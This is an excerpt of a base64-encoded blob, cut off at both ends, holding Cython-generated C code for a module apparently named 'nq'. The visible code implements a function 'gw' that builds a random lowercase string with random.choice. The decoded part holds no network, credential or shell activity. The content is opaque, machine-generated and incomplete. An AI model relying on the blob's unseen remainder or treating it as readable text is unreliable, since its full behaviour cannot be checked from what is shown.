JlZk5hbm55U2V0dXBDb250ZXh0KCJndyAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbGVuZ3RoLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImd3IiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZ3ciLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl9sZW5ndGggPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJndyIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soIm5xLmd3IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMm5xXzJndyhfX3B5eF9zZWxmLCBfX3B5eF92X2xlbmd0aCk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ybnFfMmd3XzJnZW5lcmF0b3IxKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyBcblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5xXzJnd19nZW5leHByKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpfX3B5eF9jdXJfc2NvcGU7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApO1xuICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHtcbiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilQeV9Ob25lKTtcbiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgfSBlbHNlIHtcbiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgfVxuICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3ICopIF9fcHl4X3NlbGY7XG4gIF9fUHl4X0lOQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTtcbiAgX19QeXhfR0lWRVJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTtcbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wID0gX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMm5xXzJnd18yZ2VuZXJhdG9yMSwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nd19sb2NhbHNfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25xKTsgaWYgKHVubGlrZWx5KCFnZW4pKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF9jdXJfc2NvcGUpO1xuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuO1xuICB9XG5cbiAgXG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJucS5ndy5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ybnFfMmd3XzJnZW5lcmF0b3IxKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpIFxue1xuICBzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilfX3B5eF9nZW5lcmF0b3ItPmNsb3N1cmUpO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeV9zc2l6ZV90IF9fcHl4X3RfMjtcbiAgUHlPYmplY3QgKigqX19weXhfdF8zKShQeU9iamVjdCAqKTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzg7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTtcbiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkge1xuICAgIGNhc2UgMDogZ290byBfX3B5eF9MM19maXJzdF9ydW47XG4gICAgZGVmYXVsdDogXG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIE5VTEw7XG4gIH1cbiAgX19weXhfTDNfZmlyc3RfcnVuOjtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9zZW50X3ZhbHVlKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfciA9IFB5TGlzdF9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfcikpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDFfZXJyb3IpIH1cbiAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB8fCBQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkge1xuICAgIF9fcHl4X3RfMSA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMDsgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7XG4gICAgX19weXhfdF8yID0gMDtcbiAgICBfX3B5eF90XzMgPSBOVUxMO1xuICB9IGVsc2Uge1xuICAgIF9fcHl4X3RfMiA9IC0xOyBfX3B5eF90XzEgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX3B5eF90XzMgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDFfZXJyb3IpXG4gIH1cbiAgZm9yICg7Oykge1xuICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHtcbiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihfX3B5eF90XzEsIF9fcHl4X3RfMik7XG4gICAgICAgICsrX19weXhfdF8yO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoX19weXhfdF8xKTtcbiAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X05ld1JlZihQeVR1cGxlX0dFVF9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKSk7XG4gICAgICAgICNlbHNlXG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMik7XG4gICAgICAgICNlbmRpZlxuICAgICAgICArK19fcHl4X3RfMjtcbiAgICAgIH1cbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgICB9IGVsc2Uge1xuICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIHtcbiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTtcbiAgICAgICAgaWYgKGV4Y190eXBlKSB7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICB9XG4gICAgICAgIGJyZWFrO1xuICAgICAgfVxuICAgIH1cbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9fKTtcbiAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfXywgX19weXhfdF80KTtcbiAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNCk7XG4gICAgX19weXhfdF80ID0gMDtcbiAgICBfX3B5eF90XzUgPSBOVUxMO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZS0+X19weXhfdl9sZXR0ZXJzKSkgeyBfX1B5eF9SYWlzZUNsb3N1cmVOYW1lRXJyb3IoImxldHRlcnMiKTsgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcikgfVxuICAgIF9fcHl4X3RfOCA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzcpKSkge1xuICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzUpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF83LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF84ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZS0+X19weXhfdl9sZXR0ZXJzfTtcbiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShfX1B5eF9MaXN0Q29tcF9BcHBlbmQoX19weXhfciwgKFB5T2JqZWN0KilfX3B5eF90XzQpKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoX19weXhfY3VyX3Njb3BlKTtcblxuICBcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOyBfX3B5eF9yID0gMDtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIGlmIChfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbigwKTtcbiAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgfVxuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICAjaWYgIUNZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oX19weXhfZ2VuZXJhdG9yKTtcbiAgI2VuZGlmXG4gIF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsID0gLTE7XG4gIF9fUHl4X0Nvcm91dGluZV9jbGVhcigoUHlPYmplY3QqKV9fcHl4X2dlbmVyYXRvcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5xXzJndyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9sZW5ndGgpIHtcbiAgc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgKl9fcHl4X2N1cl9zY29wZTtcbiAgUHlPYmplY3QgKl9fcHl4X2diXzJucV8yZ3dfMmdlbmVyYXRvcjEgPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzQ7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImd3IiwgMCk7XG4gIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndyAqKV9fcHl4X3RwX25ld18ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3coX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7XG4gIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkge1xuICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgKilQeV9Ob25lKTtcbiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMV9lcnJvcilcbiAgfSBlbHNlIHtcbiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgfVxuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0cmluZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDIwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXNjaWlfbG93ZXJjYXNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfdF8yKTtcbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2xldHRlcnMgPSBfX3B5eF90XzI7XG4gIF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fUH